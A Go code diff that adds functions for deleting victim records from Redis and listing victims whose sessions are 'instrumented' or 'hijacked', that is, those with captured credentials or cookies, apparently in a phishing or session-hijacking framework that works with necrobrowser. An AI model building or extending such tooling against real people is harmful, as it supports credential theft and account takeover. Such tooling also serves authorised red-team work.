@@ -271,3 +271,76 @@ func SetSessionAsInstrumented(victimID string) error {
 
 	return nil
 }
+
+// DeleteVictim removes a victim and all of its associated keys
+// (main hash, credential entries, cookiejar entries and the cookiejar list),
+// as well as its ID from the "victims" list.
+func DeleteVictim(id string) error {
+	rc := session.RedisPool.Get()
+	defer rc.Close()
+
+	keys := []string{
+		fmt.Sprintf("victim:%s", id),
+		fmt.Sprintf("victim:%s:cookiejar_entries", id),
+	}
+
+	for _, pat := range []string{
+		fmt.Sprintf("victim:%s:creds:*", id),
+		fmt.Sprintf("victim:%s:cookiejar:*", id),
+	} {
+		found, err := redis.Strings(rc.Do("KEYS", pat))
+		if err != nil {
+			return err
+		}
+		keys = append(keys, found...)
+	}
+
+	for _, k := range keys {
+		if _, err := rc.Do("DEL", k); err != nil {
+			return err
+		}
+	}
+
+	// remove the victim ID from the victims list
+	if _, err := rc.Do("LREM", "victims", 0, id); err != nil {
+		return err
+	}
+
+	return nil
+}
+
+// GetInstrumentedVictims returns victims whose session has been handed
+// off to the browser instrumentation (e.g. necrobrowser).
+func GetInstrumentedVictims() ([]Victim, error) {
+	all, err := GetAllVictims()
+	if err != nil {
+		return nil, err
+	}
+
+	var out []Victim
+	for _, v := range all {
+		if v.SessionInstrumented {
+			out = append(out, v)
+		}
+	}
+
+	return out, nil
+}
+
+// GetHijackedVictims returns victims with an active hijacked session,
+// i.e. those with at least one captured credential or cookie.
+func GetHijackedVictims() ([]Victim, error) {
+	all, err := GetAllVictims()
+	if err != nil {
+		return nil, err
+	}
+
+	var out []Victim
+	for _, v := range all {
+		if v.CredsCount > 0 || len(v.Credentials) > 0 || len(v.Cookies) > 0 {
+			out = append(out, v)
+		}
+	}
+
+	return out, nil
+}
